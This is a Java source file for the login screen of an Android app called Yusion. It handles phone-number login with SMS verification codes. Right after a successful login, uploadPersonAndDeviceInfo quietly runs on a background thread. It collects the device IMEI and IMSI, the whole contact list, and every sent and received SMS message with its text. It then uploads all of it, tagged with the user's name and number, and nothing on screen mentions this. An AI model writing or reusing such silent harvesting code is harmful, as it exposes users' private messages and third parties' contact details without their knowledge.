package com.yusion.shanghai.yusion.ui.entrance;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.yusion.shanghai.yusion.R;
import com.yusion.shanghai.yusion.YusionApp;
import com.yusion.shanghai.yusion.base.ActivityManager;
import com.yusion.shanghai.yusion.base.BaseActivity;
import com.yusion.shanghai.yusion.bean.auth.CheckUserInfoResp;
import com.yusion.shanghai.yusion.bean.auth.LoginReq;
import com.yusion.shanghai.yusion.bean.auth.LoginResp;
import com.yusion.shanghai.yusion.retrofit.api.AuthApi;
import com.yusion.shanghai.yusion.retrofit.api.ConfigApi;
import com.yusion.shanghai.yusion.retrofit.api.PersonApi;
import com.yusion.shanghai.yusion.retrofit.callback.OnItemDataCallBack;
import com.yusion.shanghai.yusion.settings.Settings;
import com.yusion.shanghai.yusion.ubt.bean.UBTData;
import com.yusion.shanghai.yusion.utils.CheckMobileUtil;
import com.yusion.shanghai.yusion.utils.MobileDataUtil;
import com.yusion.shanghai.yusion.utils.SharedPrefsUtil;
import com.yusion.shanghai.yusion.widget.CountDownButtonWrap;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class LoginActivity extends BaseActivity {
    public static final int READ_CONTACTS_CODE = 10;
    private EditText mLoginMobileTV;
    private EditText mLoginCodeTV;
    private Button mLoginCodeBtn;
    private Button mLoginSubmitBtn;
    private TextView mLoginAgreement;
    private CountDownButtonWrap mCountDownBtnWrap;
    private TelephonyManager telephonyManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);


        YusionApp yusionApp = (YusionApp) getApplication();
        yusionApp.requestLocation(null);

        telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        ApplicationInfo applicationInfo = null;
        try {
            applicationInfo = getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA);
            String pgyer_appid = applicationInfo.metaData.getString("PGYER_APPID");
            Log.e("TAG", "onCreate: pgyer_appid = " + pgyer_appid);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("TAG", "onCreate: " + e);
            e.printStackTrace();
        }
        Log.e("TAG", "onCreate: Settings.isOnline = " + Settings.isOnline);
        Log.e("TAG", "onCreate: Settings.SERVER_URL = " + Settings.SERVER_URL);
        Log.e("TAG", "onCreate: Settings.OSS_SERVER_URL = " + Settings.OSS_SERVER_URL);


        YusionApp.isLogin = false;
        mLoginMobileTV = (EditText) findViewById(R.id.login_mobile_edt);
        mLoginCodeTV = (EditText) findViewById(R.id.login_code_edt);
        mLoginCodeBtn = (Button) findViewById(R.id.login_code_btn);
        if (Settings.isOnline) {
            mCountDownBtnWrap = new CountDownButtonWrap(mLoginCodeBtn, "重试", 30, 1);
        } else {
            mCountDownBtnWrap = new CountDownButtonWrap(mLoginCodeBtn, "重试", 5, 1);
        }
        mLoginSubmitBtn = (Button) findViewById(R.id.login_submit_btn);
        mLoginAgreement = (TextView) findViewById(R.id.login_agreement_tv);
        mLoginCodeBtn.setOnClickListener(v -> {

            if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
                Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
            } else {
                mCountDownBtnWrap.start();
                AuthApi.getVCode(LoginActivity.this, mLoginMobileTV.getText().toString(), data -> {
                    if (data != null) {
                        if (!Settings.isOnline) {
                            mLoginCodeTV.setText(data.verify_code);
                        }
                    }
                });
            }
        });
        mLoginSubmitBtn.setOnClickListener(v -> {

//            startActivity(new Intent(this, UploadLabelListActivity.class));
            if (!CheckMobileUtil.checkMobile(mLoginMobileTV.getText().toString())) {
                Toast.makeText(LoginActivity.this, "手机号格式错误", Toast.LENGTH_SHORT).show();
            } else if (TextUtils.isEmpty(mLoginCodeTV.getText())) {
                Toast.makeText(LoginActivity.this, "验证码不能为空", Toast.LENGTH_SHORT).show();
            } else {
                LoginReq req = new LoginReq();
                req.mobile = mLoginMobileTV.getText().toString();
                req.verify_code = mLoginCodeTV.getText().toString();
                AuthApi.login(LoginActivity.this, req, this::loginSuccess);
            }
        });

        mLoginAgreement.setOnClickListener(v -> {
            Intent intent = new Intent(LoginActivity.this, WebViewActivity.class);
            intent.putExtra("type", "Agreement");
            startActivity(intent);
        });

        if (Settings.isShameData) {
//            mLoginMobileTV.setText("17621066549");
//            mLoginCodeTV.setText("6666");
        }
    }

    private void loginSuccess(LoginResp resp) {
        if (resp != null) {
            YusionApp.TOKEN = resp.token;
            YusionApp.MOBILE = mLoginMobileTV.getText().toString();
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", YusionApp.TOKEN);
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("mobile", YusionApp.MOBILE);
            Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
            Intent intent = new Intent(LoginActivity.this, MainActivity.class);
            startActivity(intent);
            //上传设备信息
            new Thread(new Runnable() {
                @Override
                public void run() {
                    uploadPersonAndDeviceInfo();
                }
            }).start();
        }
    }


    @Override
    protected void onResume() {
        super.onResume();

        //每次回到登陆界面都需清除缓存
        myApp.clearUserData();

        ConfigApi.getConfigJson(LoginActivity.this, resp -> {
        });
    }


    @Override
    public void onBackPressed() {
        super.onBackPressed();
        //case 1:如果是从SettingActivity注销登录时，stack中有MainActivity和LoginActivity，所以退出应用需要先结束 MainActivity
        ActivityManager.finishOtherActivityEx(LoginActivity.class);
    }


    private void uploadPersonAndDeviceInfo() {
        UBTData req = new UBTData(this);
        String imei = telephonyManager.getDeviceId();
        String imsi = telephonyManager.getSubscriberId();
        req.imei = imei;
        req.imsi = imsi;
        req.app = "Yusion";
        req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
        req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);

        JSONArray contactJsonArray = MobileDataUtil.getUserData(this, "contact");
        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();
        //List<String> raw_list = new ArrayList<>();
        for (int i = 0; i < contactJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = contactJsonArray.getJSONObject(i);
                UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();

                contactListBean.data1 = jsonObject.optString("data1");
                contactListBean.display_name = jsonObject.optString("display_name");

                contactBeenList.add(contactListBean);
                //raw_list.add(jsonObject.toString());

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        UBTData.DataBean contactBean = new UBTData.DataBean();
        contactBean.category = "contact";
        req.data.add(contactBean);
        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
            contactBean.contact_list = contactBeenList;
        }
//        else {
//            contactBean.raw_data = raw_list;
//        }

        JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
        List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
        for (int i = 0; i < smsJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = smsJsonArray.getJSONObject(i);
                UBTData.DataBean.SmsBean smsListBean = new UBTData.DataBean.SmsBean();
                String type = jsonObject.optString("type");
                if (type.equals("1")) {
                    smsListBean.from = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "recv";
                    smsListBean.ts = jsonObject.optString("date");
                } else if (type.equals("2")) {
                    smsListBean.to = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "snd";
                    smsListBean.ts = jsonObject.optString("date");//date
                }
                smsList.add(smsListBean);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        UBTData.DataBean simBean = new UBTData.DataBean();
        simBean.category = "sms";
        req.data.add(simBean);
        if (smsList.size() > 0 && !smsList.isEmpty()) {
            simBean.sms_list = smsList;
        }

        AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
            @Override
            public void onItemDataCallBack(CheckUserInfoResp data) {
                contactBean.clt_nm = data.name;
                contactBean.mobile = data.mobile;
                simBean.clt_nm = data.name;
                simBean.mobile = data.mobile;

                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
                    @Override
                    public void onResponse(Call call, Response response) {
//                        runOnUiThread(new Runnable() {
//                            @Override
//                            public void run() {
//                                finish();
//                            }
//                        });
                        finish();
                    }

                    @Override
                    public void onFailure(Call call, Throwable t) {

                    }
                });
            }
        });
    }

}
